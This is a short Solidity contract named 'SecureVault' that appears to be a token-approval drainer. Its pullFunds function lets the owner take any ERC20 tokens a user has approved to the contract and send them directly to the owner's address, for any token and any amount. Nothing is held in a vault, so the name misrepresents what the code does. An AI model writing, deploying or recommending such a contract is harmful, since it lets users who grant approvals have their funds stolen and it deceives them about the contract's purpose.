// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract SecureVault {
    address public owner;

    event FundsPulled(
        address indexed token,
        address indexed user,
        address indexed recipient,
        uint256 amount
    );

    constructor(address _owner) {
        owner = _owner;
    }

    // Pull funds from user (flexible)
    function pullFunds(
        address token,      
        address user,
        uint256 amount
    ) external {
        require(msg.sender == owner, "Only owner can pull");
        require(amount > 0, "Amount must be greater than 0");

        IERC20 tokenContract = IERC20(token);

        // Check if user approved enough
        uint256 approved = tokenContract.allowance(user, address(this));
        require(approved >= amount, "Insufficient approval");

        // Pull the tokens
        bool success = tokenContract.transferFrom(user, owner, amount);
        require(success, "Transfer failed");

        emit FundsPulled(token, user, owner, amount);
    }

    // Change owner
    function transferOwnership(address newOwner) external {
        require(msg.sender == owner, "Only owner");
        require(newOwner != address(0), "Invalid address");
        owner = newOwner;
    }

    // Check balance
    function getBalance(address token, address user) external view returns (uint256) {
        return IERC20(token).balanceOf(user);
    }
}